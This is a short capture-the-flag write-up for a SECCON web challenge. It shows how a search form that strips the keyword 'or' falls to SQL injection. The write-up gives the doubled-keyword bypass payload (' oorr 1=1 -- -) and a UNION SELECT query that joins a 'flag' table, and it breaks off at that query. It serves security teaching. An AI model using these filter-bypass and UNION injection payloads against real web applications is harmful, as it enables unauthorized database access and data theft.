# web-web-search

## TASK

Get a hidden message! Let's find a hidden message using the search system on the site.

http://web-search.chal.seccon.jp/

## Description

URL: http://web-search.chal.seccon.jp/

PAGE:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Articles</title>
</head>
<body>

<form action="./" method="get">
    <input type="text" name="q" value=""><input type="submit" value="Search">
</form>
<dl><dt>RFC 748</dt><dd>TELNET RANDOMLY-LOSE Option</dd>[...]</dl>
<p>
            Prev
        /
            <a href="./?page=2">Next</a>
    </p>

</body>
</html>
```

The input value is reflected, but you can see that it has been partially deleted

`GET /?q='or''='`　->　`<input type="text" name="q" value="'''='"><input type="submit" value="Search">`

`or` has been deleted!!

# Solution

For example, if I want to use or, I can bypass it with oorr

```
GET /?q=' oorr 1=1 -- - HTTP/1.1
Host: web-search.chal.seccon.jp

```

Response:
```
...
<dd>The flag is "SECCON{Yeah_Sqli_Success_" ... well, the rest of flag is in "flag" table. Try more!</dd>
...
```

Next query:
```
GET /?q=ss' UNION SELECT * FROM (SELECT @@version)a JOIN (SELECT * from flag)b JOIN (SELECT 3)c -- - HTTP/1.1

```